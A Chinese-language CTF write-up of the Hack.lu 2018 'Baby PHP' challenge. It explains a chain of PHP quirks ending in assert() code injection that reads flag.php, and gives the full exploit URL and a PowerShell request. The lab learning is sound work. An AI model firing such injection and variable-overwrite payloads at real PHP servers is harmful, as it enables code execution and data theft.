Baby PHP 解题笔记

> 平台：CTFHub · Web 技能树 · PHP 特性
> 原题：Hack.lu CTF 2018 - Baby PHP
> 难度：★★★★☆（六层 PHP 特性组合）
> 完成时间：2026-10-11 · 我的第一道 CTF

---

## 一、题目源码

```php
<?php
require_once('flag.php');
error_reporting(0);

if(!isset($_GET['msg'])){
    highlight_file(__FILE__);
    die();
}

@$msg = $_GET['msg'];
if(@file_get_contents($msg)!=="Hello Challenge!"){
    die('Wow so rude!!!!1');
}

echo "Hello Hacker! Have a look around.\n";

@$k1=$_GET['key1'];
@$k2=$_GET['key2'];

$cc = 1337;$bb = 42;

if(intval($k1) !== $cc || $k1 === $cc){
    die("lol no\n");
}

if(strlen($k2) == $bb){
    if(preg_match('/^\d+＄/', $k2) && !is_numeric($k2)){
        if($k2 == $cc){
            @$cc = $_GET['cc'];
        }
    }
}

list($k1,$k2) = [$k2, $k1];

if(substr($cc, $bb) === sha1($cc)){
    foreach ($_GET as $lel => $hack){
        $$lel = $hack;
    }
}

$‮b = "2";$a="‮b";//;1=b   ← 变量名含不可见字符 U+202E(RLO)

if($$a !== $k1){
    die("lel no\n");
}

assert_options(ASSERT_BAIL, 1);
assert("$bb == $cc");

echo "Good Job ;)";
// TODO
// echo $flag;
```

**读题三步法**：找输入点（`$_GET`）→ 找每一道 `if` 在拦什么 → 找到输出 flag 的位置（本例中 `echo $flag` 被注释掉了，所以必须自己制造输出点）。

---

## 二、逐关突破

### 关卡 1 · `file_get_contents` 要求内容等于 `Hello Challenge!`

```php
if(@file_get_contents($msg)!=="Hello Challenge!") die('Wow so rude!!!!1');
```

需要"有一个内容为 `Hello Challenge!` 的文件"，但无法上传文件。
→ 用 **`data://` 伪协议**凭空造一个：

```
msg=data://text/plain,Hello%20Challenge!
```

### 关卡 2 · `intval` 与 `===` 的类型缝隙

```php
if(intval($k1) !== $cc || $k1 === $cc) die("lol no\n");   // $cc = 1337
```

要活下来必须同时满足：`intval($k1) === 1337` 且 `$k1 !== 1337`。
`$k1` 从 GET 传来是**字符串**，`"1337" === 1337` 天然为 false（类型不同），而 `intval("1337") === 1337` 成立。

```
key1=1337
```

### 关卡 3 · 全角字符 + `strlen` 按字节计算（本题最精妙的一关）

```php
if(strlen($k2) == 42){
    if(preg_match('/^\d+＄/', $k2) && !is_numeric($k2)){
        if($k2 == 1337){ @$cc = $_GET['cc']; }
    }
}
```

三个条件看似矛盾：**纯数字** 却 **不是数字**，还要 **等于 1337**。

破解点在两个细节：
1. 正则里的 `＄` 是**全角美元符 U+FF04**（不是半角锚点 `$`），它是被匹配的字面字符；
2. `strlen()` 返回的是**字节数**，全角＄在 UTF-8 下占 **3 个字节**。

所以构造：`35 个 0 + 1337 + 全角＄` → 35+4 个字符 + 3 字节 = **strlen 正好 42**，且：
- `^\d+＄` 匹配 ✓
- `is_numeric` 为 false（含全角字符）✓
- 弱比较 `== 1337` 成立（前导零不影响）✓

```
key2=000000000000000000000000000000000001337%ef%bc%84
                                              ↑ %ef%bc%84 = 全角＄
```

### 关卡 4 · 数组让两个函数同时返回 null

```php
if(substr($cc, $bb) === sha1($cc)){ /* 变量覆盖区 */ }
```

`$cc` 此时已被关卡 3 赋值为 `$_GET['cc']`。若传**数组**，`substr()` 与 `sha1()` 都会返回 `null`（PHP 7 下，警告被 `error_reporting(0)` 抑制），于是 `null === null` 成立。

```
cc[]=        ← 空值数组即可
```

### 关卡 5 · 变量覆盖

```php
foreach ($_GET as $lel => $hack){ $$lel = $hack; }
```

进入这一段后，**所有 GET 参数都会变成 PHP 变量**。这是后面两关的钥匙。

### 关卡 6 · `$$a` 与 RTL 字符

```php
$‮b = "2"; $a = "‮b";
if($$a !== $k1) die("lel no\n");
```

`$$a` 是可变变量 → `$‮b` → 值为字符串 `"2"`。所以需要 `$k1 === "2"`。
而此时 `$k1` 已经被 `list()` 交换成了原 `$k2`（那串 42 字节）。
→ 利用关卡 5 的变量覆盖，直接传 `k1=2` 把 `$k1` 改写成 `"2"`：

```
k1=2
```

### 关卡 7（终点）· `assert` 代码注入

```php
assert_options(ASSERT_BAIL, 1);
assert("$bb == $cc");
```

PHP 7 中 `assert()` 收到**字符串**会把它当 PHP 代码执行（PHP 8 已移除此特性）。
`$bb` 也已被变量覆盖，于是注入：

```
bb=show_source('flag.php');//
```

展开后 `assert()` 实际执行的是 `show_source('flag.php');// == Array`，末尾 `//` 把多余部分注释掉 —— flag.php 源码被打印出来，flag 就在里面。

---

## 三、最终 Payload

```
http://<环境域名>:10800/?msg=data://text/plain,Hello%20Challenge!&key1=1337&k1=2&key2=000000000000000000000000000000000001337%ef%bc%84&cc[]=&bb=show_source%28%27flag.php%27%29%3B%2F%2F
```

Windows 下推荐用 PowerShell 发送（cmd 会破坏 URL 里的 `%`）：

```powershell
powershell -command "(Invoke-WebRequest -UseBasicParsing 'http://<域名>:10800/?msg=data://text/plain,Hello%20Challenge!&key1=1337&k1=2&key2=000000000000000000000000000000000001337%ef%bc%84&cc[]=&bb=show_source%28%27flag.php%27%29%3B%2F%2F').Content"
```

**Flag**：`ctfhub{...}`（环境动态生成，每次开启都不同）

---

## 四、知识点清单

| 知识点 | 说明 |
|---|---|
| PHP 伪协议 | `data://text/plain,<内容>` 让 `file_get_contents` 读到自定义内容 |
| 弱/强类型 | `==` 与 `===`、`intval()` 的类型转换差异 |
| `strlen` 按字节 | 多字节字符（如全角）占 3 字节，可用于精确控制长度 |
| 函数遇数组返回 null | `substr`/`sha1` 传数组返回 null，配合 `===` 绕过 |
| 变量覆盖 | `$$lel = $hack` 可改写任意已有变量 |
| 可变变量 | `$$a` 二次解析 |
| `assert` 字符串执行 | PHP 7 特性，PHP 8 已移除 |
| RTL 字符 | U+202E 会使文本反向显示，源码里常用于混淆 |## 
五、踩坑记录（我的真实错误）

1. **cmd 会吞掉 URL 里的 `%`** —— 用 `curl` 在 cmd 里发请求，带多个 `%xx` 的 URL 会被变量展开破坏。改用 PowerShell 解决。
2. **把全角＄当成复制错误** —— 一开始以为源码里的 `＄` 是复制时被转换的，实际题目就是全角，这是解题的关键。
3. **用 `1;code;//` 开头反而失败** —— 标准 payload 是 `show_source(...);//` 直接开头，不要前导 `1;`。
4. **提交 flag 时写错了前缀** —— 写成了 `flag{...}`，正确是 `ctfhub{...}`。flag 必须和源码输出**一字不差**。
5. **从截图里抄 flag 会看错字符** —— 应该用输出重定向到文件再复制：
   ```powershell
   powershell -command "(Invoke-WebRequest ...).Content" > c:\flag.txt; notepad c:\flag.txt
   ```

## 六、一句话总结

> 这道题的本质是：**七个看似独立的 PHP 特性，串成一条链，每一环的输出都是下一环的输入。**
> 解题方法不是记住这些 trick，而是养成"读源码 → 定位关卡 → 用错误反馈做探针"的习惯 —— 不同的 `die` 消息（`lol no` / `lel no` / `Good Job`）就是服务器给你的实时反馈。
